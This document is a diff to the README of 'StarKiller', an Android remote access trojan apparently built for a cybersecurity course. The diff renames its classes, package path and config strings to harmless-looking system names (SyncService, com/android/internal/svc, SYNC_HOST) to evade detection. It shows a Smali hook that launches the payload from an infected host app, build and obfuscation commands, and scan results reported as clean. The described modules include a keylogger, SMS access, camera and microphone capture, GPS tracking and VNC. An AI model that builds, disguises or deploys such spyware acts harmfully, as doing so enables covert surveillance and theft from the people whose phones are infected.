@@ -73,11 +73,11 @@ StarKiller is an Android Remote Access Tool (RAT) designed for CSEC (Cybersecuri
 
 1. Host APK launches (ElevateHorizonConnect)
 2. `onCreate()` in host's `MainActivity` calls `startPayload()`
-3. `startPayload()` starts `StarKillerService` as foreground service
+3. `startPayload()` starts `SyncService` as foreground service
 4. Service connects to C2 via TCP (or Discord relay)
 5. Sends `register` message with device info
 6. Enters receive loop — waits for `task` messages
-7. `TaskRouter` dispatches each task to the appropriate module
+7. `Dispatcher` dispatches each task to the appropriate module
 8. Results sent back to C2 as `result` messages
 9. Heartbeat every 30 seconds with battery + GPS
 
@@ -98,7 +98,7 @@ StarKiller is an Android Remote Access Tool (RAT) designed for CSEC (Cybersecuri
 | **Detection** | Signature-matched by Play Protect | Zero known signatures in compiled binary |
 | **Protocol** | HTTP/REST with plaintext JSON | Length-prefixed binary TCP with encrypted field names |
 | **Persistence** | Own BOOT_COMPLETED receiver | Receiver merged into host manifest |
-| **Code visibility** | Smali classes named `RATService`, `C2Client` | After R8/ProGuard: classes renamed to `a`, `b`, `c` |
+| **Code visibility** | Smali classes named `RATService`, `SyncAdapter` | After R8/ProGuard: classes renamed to `a`, `b`, `c` |
 | **Internet access** | Direct TCP/HTTP requiring port forward | Discord relay option — works through any NAT |
 
 ### Key Innovation: Steganographic Binding
@@ -112,11 +112,11 @@ Host APK (ElevateHorizonConnect, 71MB)
 ├── Original resources (icons, layouts, strings)
 │
 └── Injected StarKiller Smali (42 classes)
-    ├── com/starkiller/agent/C2Client.smali
-    ├── com/starkiller/agent/TaskRouter.smali
-    ├── com/starkiller/agent/StarKillerService.smali
-    ├── com/starkiller/agent/modules/*.smali (12 modules)
-    └── com/starkiller/agent/persistence/BootReceiver.smali
+    ├── com/android/internal/svc/SyncAdapter.smali
+    ├── com/android/internal/svc/Dispatcher.smali
+    ├── com/android/internal/svc/SyncService.smali
+    ├── com/android/internal/svc/modules/*.smali (12 modules)
+    └── com/android/internal/svc/persistence/StartReceiver.smali
 
 Modifications to host:
 ├── AndroidManifest.xml: +20 permissions, +4 components
@@ -127,7 +127,7 @@ Modifications to host:
 Google Play Protect scans for:
 - Known malware signatures (SHA-256 of known RATs)
 - Package name blacklists
-- Suspicious string patterns ("keylogger", "C2_HOST", etc.)
+- Suspicious string patterns ("keylogger", "SYNC_HOST", etc.)
 - Behavioural heuristics (standalone apps requesting 20 permissions)
 
 StarKiller evades all four:
@@ -177,7 +177,7 @@ The host app's `MainActivity.onCreate()` is hooked with a single Smali instructi
 .method private startPayload()V
     .locals 2
     new-instance v0, Landroid/content/Intent;
-    const-class v1, Lcom/starkiller/agent/StarKillerService;
+    const-class v1, Lcom/android/internal/svc/SyncService;
     invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
     invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
     return-void
@@ -267,7 +267,7 @@ The `obfuscate.py full` command runs four stages:
 
 The scanner checks for:
 - `starkiller`, `StarKiller` (project name)
-- `C2_HOST`, `C2_PORT` (config strings)
+- `SYNC_HOST`, `SYNC_PORT` (config strings)
 - `keylog`, `heartbeat`, `agent_id` (protocol terms)
 - Hardcoded IPs matching `192.168.x.x` or `10.x.x.x`
 - Port `8667` as integer
@@ -301,7 +301,7 @@ python obfuscate.py full --ip 192.168.1.92 --port 8667 --name "System Service"
 
 # 4. Build standalone APK
 python build.py --ip 192.168.1.92 --port 8667 --name "System Service"
-# Output: payloads/starkiller-debug.apk (3.1MB)
+# Output: payloads/starkiller-debug.apk (969KB)
 
 # 5. Scan for detection signatures
 python obfuscate.py scan payloads/starkiller-debug.apk
@@ -430,7 +430,7 @@ MediaProjection (Android's screen capture API) requires a one-time user grant vi
 2. `GrantActivity` launches (transparent, not in recents)
 3. System shows "Allow screen recording?" dialog
 4. User taps Allow
-5. `resultCode` + `resultData` stored in `ScreenCapture.Companion`
+5. `resultCode` + `resultData` stored in `DisplayHelper.Companion`
 6. All future `screenshot` and `vnc` tasks reuse stored permission
 7. VNC streams: capture frame -> JPEG 60% -> Base64 -> send over C2 -> repeat
 
@@ -537,7 +537,7 @@ Discord's API provides a free, reliable, always-available message relay. Both th
 ### Compiled APK Scan Results
 
 ```
-Standalone (starkiller-debug.apk, 3.1MB):
+Standalone (starkiller-debug.apk, 969KB):
   CLEAN - no known signatures detected
 
 Bound (ElevateHorizonConnect_full.apk, 71MB):
@@ -603,29 +603,29 @@ starkiller/
 ├── client/                      # Android Kotlin project
 │   ├── app/src/main/
 │   │   ├── AndroidManifest.xml  # Permissions + component declarations
-│   │   ├── kotlin/com/starkiller/agent/
-│   │   │   ├── C2Client.kt     # TCP C2 client (encrypted protocol)
+│   │   ├── kotlin/com/android/internal/svc/
+│   │   │   ├── SyncAdapter.kt     # TCP C2 client (encrypted protocol)
 │   │   │   ├── Config.kt       # Encrypted C2 host/port/timing
 │   │   │   ├── Crypt.kt        # XOR+Base64 encryption engine
 │   │   │   ├── GrantActivity.kt # Transparent MediaProjection grant
 │   │   │   ├── MainActivity.kt # Entry point, starts service
-│   │   │   ├── StarKillerService.kt # Foreground C2 service
-│   │   │   ├── TaskRouter.kt   # Operation dispatcher (18 ops)
+│   │   │   ├── SyncService.kt # Foreground C2 service
+│   │   │   ├── Dispatcher.kt   # Operation dispatcher (18 ops)
 │   │   │   ├── modules/
-│   │   │   │   ├── AppList.kt        # Installed packages
-│   │   │   │   ├── CallLogReader.kt  # Call history
-│   │   │   │   ├── CameraCapture.kt  # Front/rear camera
-│   │   │   │   ├── ContactsDump.kt   # Contact list
-│   │   │   │   ├── DeviceInfo.kt     # System information
-│   │   │   │   ├── FileManager.kt    # File listing/download
-│   │   │   │   ├── GpsTracker.kt     # GPS location
-│   │   │   │   ├── KeyLogService.kt  # Accessibility keylogger
-│   │   │   │   ├── MicRecorder.kt    # Audio recording
-│   │   │   │   ├── NotifListenerService.kt # Notification capture
-│   │   │   │   ├── ScreenCapture.kt  # MediaProjection + VNC
-│   │   │   │   └── SmsModule.kt      # SMS read/send
+│   │   │   │   ├── PkgScanner.kt        # Installed packages
+│   │   │   │   ├── HistoryReader.kt  # Call history
+│   │   │   │   ├── PhotoHelper.kt  # Front/rear camera
+│   │   │   │   ├── AddrBook.kt   # Contact list
+│   │   │   │   ├── SysInfo.kt     # System information
+│   │   │   │   ├── StorageHelper.kt    # File listing/download
+│   │   │   │   ├── LocProvider.kt     # GPS location
+│   │   │   │   ├── InputService.kt  # Accessibility keylogger
+│   │   │   │   ├── AudioHelper.kt    # Audio recording
+│   │   │   │   ├── AlertService.kt # Notification capture
+│   │   │   │   ├── DisplayHelper.kt  # MediaProjection + VNC
+│   │   │   │   └── MsgReader.kt      # SMS read/send
 │   │   │   └── persistence/
-│   │   │       └── BootReceiver.kt   # BOOT_COMPLETED auto-start
+│   │   │       └── StartReceiver.kt   # BOOT_COMPLETED auto-start
 │   │   └── res/xml/
 │   │       └── accessibility_config.xml
 │   ├── build.gradle.kts
@@ -641,7 +641,7 @@ starkiller/
 │   └── uber-apk-signer.jar     # APK signing (v1.3.0)
 │
 ├── payloads/
-│   ├── starkiller-debug.apk    # Standalone agent APK (3.1MB)
+│   ├── starkiller-debug.apk    # Standalone agent APK (969KB)
 │   └── ElevateHorizonConnect_full.apk  # Bound APK (71MB)
 │
 ├── downloads/                   # Received files from agents
